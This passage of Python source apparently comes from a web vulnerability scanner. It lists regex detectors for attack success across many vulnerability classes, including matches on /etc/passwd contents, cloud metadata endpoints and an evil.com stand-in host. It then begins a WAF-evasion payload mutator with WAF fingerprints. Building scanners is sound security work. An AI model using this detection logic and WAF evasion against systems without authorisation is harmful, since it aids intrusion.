        (r"ami-id",                             "XXE+SSRF confirmed — AWS metadata via XXE"),
        (r"computeMetadata",                    "XXE+SSRF confirmed — GCP metadata via XXE"),
        (r"instance-id",                        "XXE+SSRF confirmed — cloud metadata via XXE"),
        # ── PHP base64 exfil ─────────────────────────────────────────────
        (r"^[A-Za-z0-9+/]{40,}={0,2}$",        "XXE likely — base64-encoded file via php://filter"),
        # ── Billion laughs / entity expansion ────────────────────────────
        (r"lollollollollol",                    "XXE DoS — entity expansion (billion laughs) worked"),
        (r"aaaaaaaaaa",                         "XXE DoS — recursive entity expansion confirmed"),
        # ── Java XML parser errors ───────────────────────────────────────
        (r"org\.xml\.sax\.SAXParseException",   "XXE error — Java SAX parser"),
        (r"javax\.xml\.parsers",                "XXE error — Java XML parser"),
        (r"com\.sun\.org\.apache\.xerces",      "XXE error — Xerces parser (Java)"),
        (r"org\.apache\.xerces",                "XXE error — Apache Xerces parser"),
        (r"java\.io\.FileNotFoundException",    "XXE error — Java file access attempted"),
        (r"TransformerException",               "XXE error — Java XSLT transformer"),
        # ── PHP XML parser errors ────────────────────────────────────────
        (r"simplexml_load_string",              "XXE error — PHP SimpleXML parser"),
        (r"DOMDocument::loadXML",               "XXE error — PHP DOMDocument parser"),
        (r"XMLReader::open",                    "XXE error — PHP XMLReader parser"),
        (r"parser error.*SYSTEM.*ENTITY",       "XXE error — libxml2 entity error"),
        (r"warning.*failed to load external entity", "XXE error — libxml2 entity load failed"),
        # ── .NET XML parser errors ───────────────────────────────────────
        (r"System\.Xml\.XmlException",          "XXE error — .NET XmlReader parser"),
        (r"System\.Xml\.XmlDocument",           "XXE error — .NET XmlDocument parser"),
        (r"DTD is prohibited",                  "XXE blocked — .NET DTD processing disabled"),
        # ── Python XML parser errors ─────────────────────────────────────
        (r"xml\.etree\.ElementTree",            "XXE error — Python ElementTree parser"),
        (r"lxml\.etree",                        "XXE error — Python lxml parser"),
        (r"ExpatError",                         "XXE error — Python Expat parser"),
        # ── Ruby XML parser errors ───────────────────────────────────────
        (r"Nokogiri::XML",                      "XXE error — Ruby Nokogiri parser"),
        (r"REXML::ParseException",              "XXE error — Ruby REXML parser"),
        # ── Node.js / generic ────────────────────────────────────────────
        (r"xmldom.*parse",                      "XXE error — Node.js xmldom parser"),
        (r"SyntaxError.*XML",                   "XXE error — XML syntax error exposed"),
        (r"ENTITY.*not defined",                "XXE error — undefined entity reference"),
    ],
    "header_injection": [
        (r"X-Injected: header", "Header injection confirmed — injected header reflected"),
        (r"Set-Cookie: evil=1", "CRLF injection confirmed — cookie injected"),
        (r"Location: https?://evil\.com", "Response splitting — Location header injected"),
        (r"<html>split</html>", "HTTP response splitting — second response body injected"),
        (r"X-Forwarded-For: 127\.0\.0\.1", "Header injection — X-Forwarded-For injected"),
        (r"Host: evil\.com", "Header injection — Host header injected"),
        (r"X-XSS-Protection:\s*0", "CRLF injection — XSS protection header disabled"),
        (r"Access-Control-Allow-Origin:\s*\*", "CRLF injection — permissive CORS header injected"),
        (r"PWNED", "CRLF body injection confirmed — arbitrary body content injected"),
        (r"Transfer-Encoding:\s*chunked", "CRLF injection — Transfer-Encoding header injected"),
    ],
    "crlf_injection": [
        (r"Set-Cookie:", "CRLF injection — cookie header injected via line break"),
        (r"Injected: header", "CRLF injection — custom header injected"),
        (r"Content-Type: text/html", "CRLF injection — Content-Type overridden"),
        (r"HTTP/1\.[01] 200", "Response splitting — second HTTP response injected"),
        (r"<script>alert\(1\)</script>", "CRLF injection — XSS via body injection"),
    ],
    "jwt_confusion": [
        # Server accepted forged JWT — privilege escalation indicators
        (r'"admin"\s*:\s*true',          "JWT Confusion CONFIRMED — admin claim accepted from forged/unsigned token"),
        (r'"isAdmin"\s*:\s*true',        "JWT Confusion — isAdmin accepted from forged token"),
        (r'"role"\s*:\s*"admin"',        "JWT Confusion — admin role claim accepted"),
        (r'"role"\s*:\s*"superuser"',    "JWT Confusion — superuser role accepted from forged token"),
        (r'"is_admin"\s*:\s*true',       "JWT Confusion — is_admin claim accepted"),
        (r'"elevated"\s*:\s*true',       "JWT Confusion — elevated privilege claim accepted"),
        # HTTP 200 on typically-protected endpoint (combined with alg:none token)
        (r'"success"\s*:\s*true',        "JWT Confusion — success response after alg tampering"),
        (r'"authenticated"\s*:\s*true',  "JWT Confusion — authenticated claim in response"),
    ],
    "mass_assignment": [
        (r'"isAdmin"\s*:\s*true',       "Mass Assignment CONFIRMED — isAdmin accepted in response"),
        (r'"role"\s*:\s*"admin"',       "Mass Assignment — admin role accepted via extra field"),
        (r'"verified"\s*:\s*true',      "Mass Assignment — verified flag set via unguarded field"),
        (r'"is_superuser"\s*:\s*true',  "Mass Assignment — superuser granted via mass assignment"),
        (r'"credits"\s*:\s*9999',       "Mass Assignment — credits manipulated via direct assignment"),
        (r'"balance"\s*:\s*9999',       "Mass Assignment — balance set via unguarded field"),
        (r'"admin"\s*:\s*1',            "Mass Assignment — admin=1 accepted"),
        (r'"admin"\s*:\s*true',         "Mass Assignment — admin=true accepted from extra field"),
    ],
    "crypto_downgrade": [
        (r"(?i)http://",                 "Crypto Downgrade — plaintext HTTP URL in response after scheme manipulation"),
        (r"(?i)ssl.*disabled",           "Crypto Downgrade — SSL disabled indicator in response"),
        (r"(?i)tls.*disabled",           "Crypto Downgrade — TLS disabled in response"),
        (r"(?i)insecure.*connection",    "Crypto Downgrade — insecure connection indicator"),
        (r"(?i)cleartext.*password",     "Crypto Downgrade — cleartext password transmission"),
        (r"password.*http://",           "Crypto Downgrade CRITICAL — password in plaintext HTTP request"),
    ],
    "prototype_pollution": [
        (r'"isAdmin"\s*:\s*true',          "Prototype pollution confirmed — injected isAdmin property reflected"),
        (r'"polluted"\s*:\s*"yes"',        "Prototype pollution confirmed — injected polluted property reflected"),
        (r"Error: Cannot set property",    "Prototype pollution caused server-side TypeError"),
        (r"Cannot set properties of",      "Prototype pollution — read-only property violation"),
        (r"__proto__",                     "Prototype chain reference reflected in response"),
    ],
    "prototype_pollution_body": [
        (r'"polluted"\s*:\s*"DAST_PP_CONFIRMED"', "Prototype Pollution (body) CONFIRMED — injected key reflected in response"),
        (r'DAST_PP_CONFIRMED',                     "Prototype Pollution (body) CONFIRMED — canary reflected"),
        (r'"isAdmin"\s*:\s*true',                  "Prototype Pollution (body) — isAdmin property set server-side"),
        (r'"admin"\s*:\s*true',                    "Prototype Pollution (body) — admin property polluted"),
        (r'"DAST_PP_TOSTRING"',                    "Prototype Pollution (body) — toString override reflected"),
        (r"Cannot set properties of",              "Prototype Pollution (body) — TypeError: read-only prototype violation"),
        (r"TypeError.*Object\.prototype",          "Prototype Pollution (body) — Object.prototype mutation detected"),
    ],
    "exceptional_conditions": [
        (r"Traceback \(most recent call",  "Exceptional condition triggered — Python traceback (A10:2025)"),
        (r"Fatal error:",                  "Exceptional condition triggered — PHP fatal error"),
        (r"NullPointerException",          "Exceptional condition triggered — Java NPE"),
        (r"TypeError|ValueError|RangeError", "Exceptional condition triggered — JS/Node.js type error"),
        (r"undefined is not",              "Type confusion — JavaScript undefined error leaked"),
        (r"\bNaN\b",                       "Exceptional condition — NaN value reflected in response"),
        (r"Internal Server Error",         "Unhandled exceptional condition — 500 error on edge input"),
    ],
    # ── Buffer Overflow / Memory Corruption detectors ───────────────────
    "buffer_overflow": [
        # Segfault / crash signals
        (r"Segmentation fault",           "Buffer overflow — segmentation fault triggered"),
        (r"SIGSEGV",                      "Buffer overflow — SIGSEGV signal caught"),
        (r"SIGBUS",                       "Buffer overflow — bus error signal"),
        (r"SIGABRT",                      "Buffer overflow — abort signal (heap corruption)"),
        (r"stack smashing detected",      "Buffer overflow — stack canary tripped"),
        (r"stack buffer overflow",        "Buffer overflow — stack buffer overflow detected"),
        (r"heap-buffer-overflow",         "Buffer overflow — heap buffer overflow (ASan)"),
        (r"AddressSanitizer",             "Buffer overflow — AddressSanitizer detected corruption"),
        (r"buffer overflow",              "Buffer overflow — explicit overflow message"),
        # Access violation / memory errors
        (r"Access violation",             "Buffer overflow — access violation (Windows)"),
        (r"STATUS_STACK_BUFFER_OVERRUN",  "Buffer overflow — Windows stack buffer overrun"),
        (r"munmap_chunk.*invalid",        "Buffer overflow — glibc heap corruption"),
        (r"double free or corruption",    "Buffer overflow — double free detected"),
        (r"malloc.*assertion.*failed",    "Buffer overflow — malloc assertion failed"),
        # Format string indicators
        (r"(?:0x)?[0-9a-f]{8}(?:\.[0-9a-f]{8}){3,}", "Format string — stack data leaked via %x"),
        (r"%[0-9]*\$[xsnp]",             "Format string — format specifier reflected (not executed)"),
        # Generic crash / timeout
        (r"core dumped",                  "Buffer overflow — core dump produced"),
        (r"out of memory",               "Buffer overflow — memory exhaustion via large input"),
        (r"MemoryError",                  "Buffer overflow — Python MemoryError from large input"),
        (r"java\.lang\.OutOfMemoryError", "Buffer overflow — Java OutOfMemoryError"),
        (r"RecursionError|Maximum call stack", "Stack overflow — recursion limit from deep nesting"),
    ],
    # ── XPath Injection detectors ───────────────────────────────────────
    "xpath_injection": [
        # XPath error messages (prove injection reached parser)
        (r"XPathException",               "XPath injection — XPathException exposed"),
        (r"Invalid XPath expression",     "XPath injection — invalid expression error"),
        (r"xmlXPathEval.*error",          "XPath injection — libxml2 XPath evaluation error"),
        (r"XPathEvalError",               "XPath injection — XPath evaluation error"),
        (r"javax\.xml\.xpath",            "XPath injection — Java XPath parser error"),
        (r"XPathSyntaxError",             "XPath injection — Python lxml XPath syntax error"),
        (r"Unregistered function",        "XPath injection — unregistered XPath function"),
        (r"Expected node test",           "XPath injection — unexpected node test error"),
        (r"XMLXPathError",               "XPath injection — XPath error in response"),
        # Boolean extraction indicators
        (r"(?:true|false)\s*$",           "XPath injection — boolean result leaked (blind extraction)"),
        # Authentication bypass indicators
        (r"admin|root|superuser",         "XPath injection — privileged data in response"),
        # Node/document structure leak
        (r"<[a-zA-Z]+>.*</[a-zA-Z]+>",   "XPath injection — XML node structure leaked"),
    ],

    # ── IDOR / Broken Access Control detectors ───────────────────────────
    "idor": [
        # ── PII exposure (suggests data from another user) ───────────────
        (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "IDOR likely — email address exposed on ID-swapped request"),
        (r"\b\d{3}-\d{2}-\d{4}\b",
            "IDOR CRITICAL — SSN-like pattern in response on ID swap"),
        (r"\b\d{13,19}\b",
            "IDOR likely — possible credit card number in response"),
        (r"\"(password|passwd|secret|token|api_key|apikey)\"",
            "IDOR — sensitive field name in response body"),
        # ── User data structure patterns ─────────────────────────────────
        (r"\"(user_id|userId|account_id|accountId)\":\s*\d+",
            "IDOR likely — user/account ID field in response"),
        (r"\"(username|user_name|first_name|last_name|full_name)\":\s*\"",
            "IDOR likely — user profile data in response"),
        (r"\"(address|phone|mobile|ssn|dob|date_of_birth)\"",
            "IDOR — personal data field exposed on ID swap"),
        # ── Admin/privileged content indicators ──────────────────────────
        (r"\"(role|is_admin|isAdmin|admin|privilege|permission)\"",
            "IDOR — role/privilege field exposed"),
        (r"\"(internal|private|confidential|restricted)\"",
            "IDOR — access to restricted/internal content"),
        # ── ACL bypass indicators ────────────────────────────────────────
        (r"Spring Boot Actuator",
            "ACL bypass — Spring Boot Actuator endpoint accessible"),
        (r"Swagger|swagger-ui|openapi",
            "ACL bypass — API documentation endpoint accessible"),
        (r"phpMyAdmin|phpmyadmin",
            "ACL bypass — phpMyAdmin accessible without auth"),
        (r"graphiql|GraphQL Playground",
            "ACL bypass — GraphQL IDE accessible"),
        (r"\"(env|environment)\".*\"(production|staging|development)\"",
            "ACL bypass — environment config exposed"),
    ],

    # ── ACL bypass (checked via header-injection method) ─────────────────
    "acl_bypass": [],  # Detection is status-code based in _fuzz_idor, not pattern-based

    # ── LDAP Injection detectors ──────────────────────────────────────────
    "ldap_injection": [
        (r"(?i)javax\.naming\.NamingException",     "LDAP injection — Java JNDI naming exception"),
        (r"(?i)LDAP.*error",                        "LDAP injection — LDAP protocol error"),
        (r"(?i)invalid DN syntax",                  "LDAP injection — invalid DN syntax error"),
        (r"(?i)bad search filter",                  "LDAP injection — malformed filter error"),
        (r"(?i)(?:cn|uid|ou|dc|sn|mail)\s*=",      "LDAP injection — LDAP attribute in response"),
        (r"(?i)objectClass",                        "LDAP injection — LDAP objectClass attribute leaked"),
        (r"(?i)ldap_search\(\)",                    "LDAP injection — PHP ldap_search error"),
        (r"(?i)Net::LDAP",                          "LDAP injection — Perl/Ruby LDAP library error"),
        (r"(?i)Size limit exceeded",                "LDAP injection — query returned too many results"),
    ],

    # ── NoSQL Injection detectors ──────────────────────────────────────────
    "nosql_injection": [
        (r"MongoError",                             "NoSQL injection — MongoDB error"),
        (r"(?i)\$err.*?not.*?valid",                "NoSQL injection — MongoDB invalid query"),
        (r"(?i)cannot apply.*\$gt.*to.*string",     "NoSQL injection — MongoDB operator type error"),
        (r"(?i)BadValue.*unknown operator",         "NoSQL injection — MongoDB unknown operator"),
        (r"(?i)CastError.*ObjectId",                "NoSQL injection — MongoDB ObjectId cast error"),
        (r"(?i)SyntaxError.*JSON",                  "NoSQL injection — malformed JSON in query"),
        (r"(?i)Unterminated string",                "NoSQL injection — unterminated string in JS eval"),
        (r"(?i)ReferenceError.*not defined",        "NoSQL injection — JS $where variable error"),
        (r"(?i)compilation failed",                 "NoSQL injection — MongoDB aggregation compile error"),
        (r"(?i)no_ns_found|ns not found",           "NoSQL injection — MongoDB namespace error"),
    ],

    # ── HTTP Parameter Pollution ───────────────────────────────────────────
    "hpp": [
        (r"HPP_INJECTED",                           "HPP — injected duplicate parameter reflected"),
        (r"HPP_SECOND",                             "HPP — second parameter value reflected"),
        (r"HPP_ARRAY",                              "HPP — array parameter value reflected"),
        (r"HPP_FIRST.*HPP_SECOND",                  "HPP — both parameter values concatenated"),
    ],

    # ── Host Header Injection ──────────────────────────────────────────────
    "host_header": [
        (r"evil\.com",                              "Host header injection — evil.com reflected in response"),
        (r"X-Injected: header",                     "Host header CRLF injection — header injected"),
        (r"(?i)password.*reset.*evil\.com",         "Host header poisoning — password reset to evil domain"),
        (r"(?i)(?:href|src|action)\s*=\s*['\"]https?://evil\.com",
            "Host header injection — evil.com in page links/forms"),
    ],

    # ── Deserialization detectors ──────────────────────────────────────────
    "deserialization": [
        # Java
        (r"java\.io\.ObjectInputStream",            "Deserialization — Java ObjectInputStream error"),
        (r"java\.io\.InvalidClassException",        "Deserialization — Java invalid class exception"),
        (r"java\.lang\.ClassNotFoundException",     "Deserialization — Java class not found (gadget chain)"),
        (r"java\.lang\.ClassCastException",         "Deserialization — Java class cast exception"),
        (r"org\.apache\.commons\.collections",      "Deserialization — Commons-Collections gadget triggered"),
        (r"(?i)serialization.*error",               "Deserialization — serialization error exposed"),
        # PHP
        (r"unserialize\(\)",                        "Deserialization — PHP unserialize() error"),
        (r"__wakeup\(\)",                           "Deserialization — PHP magic method triggered"),
        (r"Allowed memory size.*exhausted",         "Deserialization — PHP memory exhaustion via unserialize"),
        # Python
        (r"pickle\.UnpicklingError",                "Deserialization — Python pickle error"),
        (r"_pickle\.UnpicklingError",               "Deserialization — Python C pickle error"),
        # .NET
        (r"System\.Runtime\.Serialization",         "Deserialization — .NET serialization error"),
        (r"TypeInitializationException",            "Deserialization — .NET type init from deserialization"),
        # Node.js
        (r"node-serialize",                         "Deserialization — Node.js node-serialize error"),
    ],

    # ── Log4Shell / JNDI Injection detectors ───────────────────────────────
    "log4shell": [
        # High-confidence: exceptions that only fire when Log4j processes our JNDI string
        (r"(?i)com\.sun\.jndi\.(ldap|rmi|dns)\.",   "Log4Shell — Sun JNDI transport class in response"),
        (r"(?i)javax\.naming\.NamingException",      "Log4Shell — JNDI naming exception triggered"),
        (r"(?i)log4j.*error.*jndi",                  "Log4Shell — Log4j JNDI error in response"),
        (r"(?i)log4j\.core\.net\.JndiManager",       "Log4Shell — JndiManager class in response"),
        # ${java:version} / ${sys:os.name} lookup results — must be isolated system property values
        # (not just "java" or "os" appearing anywhere)
        (r"(?i)Java\s+SE\s+(?:Runtime|JDK)\s+\d",   "Log4Shell — Java version string from ${java:version} lookup"),
        (r"(?i)\bLinux\b.*\bx86_64\b",               "Log4Shell — OS info string from ${sys:os} lookup"),
        # Error patterns specific to JNDI loading
        (r"(?i)LDAP.*(Connection refused|no route to host|connection timed out)",
                                                     "Log4Shell — LDAP connection attempt from server"),
        (r"(?i)Reference Class Name.*ldap",          "Log4Shell — JNDI LDAP reference class loaded"),
    ],

    # ── Expression Language Injection detectors ────────────────────────────
    "el_injection": [
        # 49 must appear as a standalone token in a minimal response — not inside a larger number
        # or sentence. Anchored to line-start or whitespace context to avoid "349px" etc.
        (r"(?:^|\s|[=:,{\[])49(?:\s|[}\],;]|$)",   "EL injection — 7*7=49 expression evaluated"),
        (r"javax\.el\.ELException",                 "EL injection — Java EL exception"),
        (r"org\.springframework\.expression",       "EL injection — Spring SpEL exception"),
        (r"java\.lang\.Runtime@",                   "EL injection — Java Runtime class accessible"),
        (r"java\.lang\.ProcessBuilder",             "EL injection — ProcessBuilder class accessible"),
        (r"SpelEvaluationException",                "EL injection — SpEL evaluation exception"),
        (r"ognl\.OgnlException",                    "EL injection — OGNL exception (Struts)"),
        # applicationScope / pageContext only valid if NOT echoing our own payload back
        # (echo-guard is applied in detection loop for el_injection)
        (r"applicationScope\s*=",                   "EL injection — application scope value extracted"),
        (r"pageContext\s*=\s*\{",                   "EL injection — JSP pageContext object dumped"),
    ],

    # ── Web Cache Poisoning detectors ──────────────────────────────────────
    "cache_poisoning": [
        # Only flag evil.com reflection if also confirmed via X-Cache HIT (handled in detection loop)
        (r"evil\.com",                              "Cache poisoning — poisoned value (evil.com) in response"),
        (r"nothttps",                               "Cache poisoning — X-Forwarded-Proto value reflected"),
        (r"x-cache-poison-confirm",                 "Cache poisoning — confirmed via probe header reflection"),
    ],

    # ── CSRF bypass (detection is response-comparison based) ───────────────
    "csrf": [
        # Rejection indicators — server IS protecting (checked first in _fuzz_csrf logic)
        (r"(?i)(?:invalid|expired|missing|mismatch)\s+(?:csrf|xsrf|authenticity)[\s_\-]?token",
            "CSRF_PROTECTED — server rejected invalid CSRF token"),
        (r"(?i)csrf[\s_\-]?token\s+(?:invalid|expired|mismatch|missing|required)",
            "CSRF_PROTECTED — CSRF token validation message"),
        (r"(?i)(?:403|forbidden).*(?:csrf|xsrf|token|origin)",
            "CSRF_PROTECTED — 403 with CSRF/token reference"),
        (r"(?i)security\s+(?:token|check)\s+(?:failed|invalid|mismatch)",
            "CSRF_PROTECTED — security token check failed"),
        # Sensitive action confirmed WITHOUT token — only specific high-value patterns
        (r"(?i)password\s+(?:changed|updated|reset)\s+successfully",
            "CSRF bypass — password change accepted without valid CSRF token"),
        (r"(?i)(?:account|profile)\s+(?:deleted|closed|deactivated|removed)",
            "CSRF bypass — destructive account action without CSRF token"),
        (r"(?i)(?:payment|transfer|funds?)\s+(?:processed|sent|completed|confirmed)",
            "CSRF bypass — financial action accepted without CSRF token"),
        (r"(?i)(?:email|username|2fa|mfa)\s+(?:changed|updated|disabled|enabled)",
            "CSRF bypass — security setting changed without CSRF token"),
    ],

    # ── HTTP Request Smuggling ─────────────────────────────────────────────
    "http_smuggling": [
        # Server error indicators suggesting desync confusion
        (r"(?i)bad\s+request", "Smuggling — server returned Bad Request (possible desync)"),
        (r"(?i)invalid\s+(?:chunk|transfer|content[\s-]length)",
            "Smuggling — server rejected malformed CL/TE (processing confusion)"),
        (r"(?i)(?:400|501)\s+(?:bad|not\s+implemented)",
            "Smuggling — error status in response body"),
        (r"(?i)chunked\s+(?:encoding|transfer)\s+(?:error|not\s+supported|invalid)",
            "Smuggling — chunked encoding handling error"),
        (r"(?i)content[\s-]length\s+mismatch",
            "Smuggling — CL mismatch detected by server"),
        (r"(?i)request\s+(?:timeout|timed?\s*out)",
            "Smuggling — request timeout (possible hung parser)"),
        (r"(?i)(?:proxy|gateway)\s+(?:error|timeout|502|504)",
            "Smuggling — proxy/gateway error (frontend/backend desync)"),
        (r"(?i)transfer[\s-]encoding.*(?:not\s+supported|invalid|rejected)",
            "Smuggling — TE header rejected"),
        (r"(?i)(?:unexpected|premature)\s+(?:end|eof|close|disconnect)",
            "Smuggling — unexpected connection close (desync indicator)"),
        (r"(?i)(?:duplicate|conflicting)\s+(?:header|content[\s-]length|transfer[\s-]encoding)",
            "Smuggling — server detected duplicate/conflicting headers"),
        (r"(?i)http\s+version\s+not\s+supported",
            "Smuggling — HTTP version confusion"),
        (r"(?i)(?:connection|socket)\s+(?:reset|closed|refused|broken)",
            "Smuggling — connection disruption (possible desync side effect)"),
    ],

    # ── SSI Injection detectors ──────────────────────────────────────────────
    "ssi_injection": [
        (r"DOCUMENT_ROOT",                              "SSI injection — DOCUMENT_ROOT variable leaked"),
        (r"SERVER_SOFTWARE",                             "SSI injection — SERVER_SOFTWARE variable leaked"),
        (r"root:.*:0:0:",                                "SSI injection — /etc/passwd contents via exec/include"),
        (r"DAST-SSI-DETECTED",                           "SSI injection — custom error message reflected"),
        (r"SSI_WORKS",                                   "SSI injection — set variable reflected"),
        (r"\[an error occurred while processing",        "SSI injection — SSI processing error (server has SSI enabled)"),
        (r"mod_include",                                 "SSI injection — mod_include reference in error"),
    ],

    # ── RFI detectors ────────────────────────────────────────────────────────
    "rfi": [
        (r"evil\.com",                                   "RFI — remote host reflected (evil.com)"),
        (r"169\.254\.169\.254",                          "RFI — SSRF/RFI to metadata endpoint"),
        (r"ami-id|instance-id|security-credentials",     "RFI — AWS metadata leaked via RFI"),
        (r"root:.*:0:0:",                                "RFI — /etc/passwd retrieved via remote include"),
        (r"<\?php",                                      "RFI — PHP source included and rendered"),
        (r"failed to open stream.*http",                 "RFI — PHP allow_url_include attempt detected"),
        (r"include\(\)|require\(\)",                     "RFI — PHP include/require error"),
    ],

    # ── Format String detectors ──────────────────────────────────────────────
    "format_string": [
        (r"(?:0x)?[0-9a-f]{6,8}(?:\.(?:0x)?[0-9a-f]{6,8}){3,}",
            "Format string — memory addresses leaked (%x pattern)"),
        (r"\(nil\)",                                     "Format string — null pointer leaked (%p pattern)"),
        (r"Segmentation fault|SIGSEGV|Access violation",
            "Format string — crash from write primitive (%n)"),
        (r"%s%s%s%s%s",                                  "Format string — format specifiers reflected unchanged"),
    ],

    # ── LaTeX Injection detectors ────────────────────────────────────────────
    "latex_injection": [
        (r"root:.*:0:0:",                               "LaTeX injection — /etc/passwd content in response"),
        (r"nobody:.*:/var/empty",                       "LaTeX injection — /etc/passwd user entry leaked"),
        (r"DAST-LATEX-PROBE",                           "LaTeX injection — \\typeout canary reflected"),
        (r"DAST-LATEX-ERROR-PROBE",                     "LaTeX injection — \\errmessage canary reflected"),
        (r"(?i)pdflatex.*error|latex.*error|tex.*error", "LaTeX injection — LaTeX processing error in response"),
        (r"(?i)\\input\{.*\}|\\include\{",              "LaTeX injection — LaTeX directive reflected unchanged"),
        (r"(?i)Undefined control sequence",             "LaTeX injection — TeX undefined control sequence error"),
        (r"(?i)LaTeX Error:|TeX capacity exceeded",     "LaTeX injection — LaTeX fatal error triggered"),
        (r"(?i)(?:kpathsea|mktexlsr|texmf)",            "LaTeX injection — TeX file system path leaked"),
        (r"(?i)\\write18|\\immediate",                  "LaTeX injection — shell escape directive reflected"),
        (r"(?i)Package inputenc Error",                 "LaTeX injection — LaTeX package error in response"),
    ],

    # ── CSS Injection / Attribute Selector Exfiltration detectors ───────────
    "css_injection": [
        (r"background(?:-image)?:\s*url\s*\(",          "CSS injection — url() function reflected in style context"),
        (r"input\[name=['\"]",                          "CSS injection — attribute selector reflected in CSS"),
        (r"evil\.com",                                  "CSS injection — OOB callback domain reflected"),
        (r"@import\s+url\s*\(",                         "CSS injection — @import url() reflected"),
        (r"(?i)background:\s*expression\s*\(",          "CSS injection — expression() RCE (IE) reflected"),
        (r"(?i)</style>\s*<style",                      "CSS injection — style block injection breakout"),
        (r"color\s*:\s*red",                            "CSS injection — injected CSS property reflected"),
        (r"--[a-z][-a-z0-9]*\s*:\s*url\s*\(",          "CSS injection — CSS variable with url() reflected"),
        (r"@charset\s+['\"]",                           "CSS injection — @charset directive injected"),
    ],

    # ── Spring4Shell + Text4Shell detectors ─────────────────────────────────
    "spring4shell": [
        # Spring4Shell indicators
        (r"(?i)classloader|ClassLoader",                "Spring4Shell — classLoader reflection attempt responded"),
        (r"(?i)java\.lang\.Class",                      "Spring4Shell — Java Class reflection in response"),
        (r"(?i)DataBinder|AbstractNestablePropertyAccessor",
            "Spring4Shell — Spring DataBinder error exposed"),
        (r"(?i)org\.springframework\.beans",            "Spring4Shell — Spring beans exception in response"),
        (r"(?i)Invalid property.*class",               "Spring4Shell — Spring invalid property for class param"),
        (r"(?i)PropertyAccessException",               "Spring4Shell — Spring property access exception"),
        (r"(?i)BeanCreationException",                  "Spring4Shell — Spring bean creation failure"),
        # Text4Shell (Commons Text) indicators
        (r"(?i)IllegalArgumentException.*lookup",       "Text4Shell — Commons Text lookup error"),
        (r"(?i)commons.text|StringSubstitutor",         "Text4Shell — Apache Commons Text class in error"),
        (r"(?i)ScriptStringLookup|JavaPlatformLookup",  "Text4Shell — Commons Text lookup class exposed"),
        (r"(?i)LookupException|SubstitutionException",  "Text4Shell — Commons Text substitution error"),
        (r"(?i)\$\{url:|dns:address\|",                 "Text4Shell — interpolation syntax reflected"),
    ],

    # ── XSLT Injection detectors ─────────────────────────────────────────────
    "xslt_injection": [
        (r"root:.*:0:0:",                               "XSLT injection — /etc/passwd content via document()"),
        (r"DAST-XSLT-PROBE",                            "XSLT injection — canary string in response"),
        (r"169\.254\.169\.254",                         "XSLT injection — SSRF to metadata via document()"),
        (r"(?i)TransformerException|TransformerError",  "XSLT injection — Java XSLT transformer exception"),
        (r"(?i)javax\.xml\.transform",                  "XSLT injection — Java XML transform class in error"),
        (r"(?i)org\.apache\.xalan|net\.sf\.saxon",      "XSLT injection — XSLT processor class in response"),
        (r"(?i)SaxonApiException|XPathException",       "XSLT injection — Saxon XSLT engine error"),
        (r"(?i)XSLTProcessor|xslt_process",             "XSLT injection — PHP XSLT processor error"),
        (r"(?i)php:function|php:functionString",        "XSLT injection — PHP extension function reflected"),
        (r"(?i)document\('/etc|document\('file://",     "XSLT injection — document() file path reflected"),
        (r"(?i)Sablotron|XSL Transformation",           "XSLT injection — XSLT processor name in response"),
        (r"(?i)division by zero|XPath.*error",          "XSLT injection — XSLT evaluation error (canary div 0)"),
    ],

    # ── XML Injection detectors ──────────────────────────────────────────────
    "xml_injection": [
        (r"root:.*:0:0:",                                "XML injection — file content via XInclude"),
        (r"<script>alert\(1\)</script>",                 "XML injection — CDATA XSS breakout"),
        (r"XML Parsing Error|xml\.parsers|SAXParseException",
            "XML injection — parser error exposed"),
        (r"not well-formed|invalid.*xml|malformed",      "XML injection — malformed XML error"),
        (r"entity.*not.*defined|undefined entity",       "XML injection — entity processing error"),
        (r"XInclude|xi:include",                         "XML injection — XInclude directive processed"),
    ],

    # ── Dangling Markup detectors ────────────────────────────────────────────
    "dangling_markup": [
        (r"<img[^>]*src=['\"]//evil\.com/dm",            "Dangling markup — partial img src reflected unescaped"),
        (r"<svg[^>]*><use[^>]*href=['\"]//evil\.com",    "Dangling markup — SVG use href reflected unescaped"),
        (r"<base[^>]*href=['\"]//evil\.com",             "Dangling markup — base tag injection reflected"),
        (r"<form[^>]*action=['\"]//evil\.com",           "Dangling markup — form action hijack reflected"),
        (r"<link[^>]*href=['\"]//evil\.com/dm",          "Dangling markup — link preload reflected unescaped"),
    ],
}


def _extend_unique_values(target: list, additions: list) -> None:
    """Append additions to a list while preserving order and avoiding duplicates."""
    seen = set()
    for item in target:
        try:
            seen.add(item)
        except TypeError:
            seen.add(repr(item))
    for item in additions:
        marker = item
        try:
            is_new = marker not in seen
        except TypeError:
            marker = repr(item)
            is_new = marker not in seen
        if is_new:
            target.append(item)
            seen.add(marker)


for _vuln_type, _payloads in ACTIVE_PAYLOAD_EXTENSIONS.items():
    _extend_unique_values(PAYLOADS.setdefault(_vuln_type, []), _payloads)

for _vuln_type, _detectors in DETECTOR_EXTENSIONS.items():
    _extend_unique_values(DETECTORS.setdefault(_vuln_type, []), _detectors)


class PayloadMutator:
    """WAF evasion payload mutation engine — 30 strategies with context-aware selection."""

    # ── WAF Fingerprinting ──────────────────────────────────────────────────
    # Maps (header_key, header_pattern, body_pattern) → WAF name
    WAF_FINGERPRINTS: list[tuple[str, str | None, str | None, str | None]] = [
        # (waf_name, header_key, header_pattern, body_pattern)
        ("Cloudflare",   "server",     r"cloudflare",          r"Attention Required.*Cloudflare|cf-ray"),
        ("Cloudflare",   "cf-ray",     r".+",                  None),
        ("ModSecurity",  "server",     r"Mod_Security|NOYB",   r"Mod_Security|not acceptable|SecRule"),
        ("AWS WAF",      None,         None,                   r"AWS WAF|Request blocked|awswaf"),
        ("Imperva",      "x-iinfo",    r".+",                  r"Incapsula incident|imperva"),
        ("Akamai",       "server",     r"AkamaiGHost",         r"Access Denied.*Akamai|Reference #"),
        ("F5 BIG-IP",    "server",     r"BigIP|BIG-IP",        r"The requested URL was rejected"),
        ("Sucuri",       "server",     r"Sucuri",              r"Sucuri Website Firewall|Access Denied.*Sucuri"),
        ("Barracuda",    "server",     r"Barracuda",           r"You are being blocked|Barracuda"),
        ("Fortinet",     "server",     r"FortiWeb|Fortinet",   r"FortiGuard|web page blocked"),
        ("Wallarm",      "server",     r"wallarm",             None),
        ("DenyAll",      "server",     r"DenyAll",             None),
        ("Wordfence",    None,         None,                   r"wordfence|generated by Wordfence"),
        ("Comodo",       "server",     r"Comodo",              r"Protected by COMODO"),
        ("Azure Front Door", "x-azure-ref", r".+",      r"Azure Front Door|This request was blocked"),
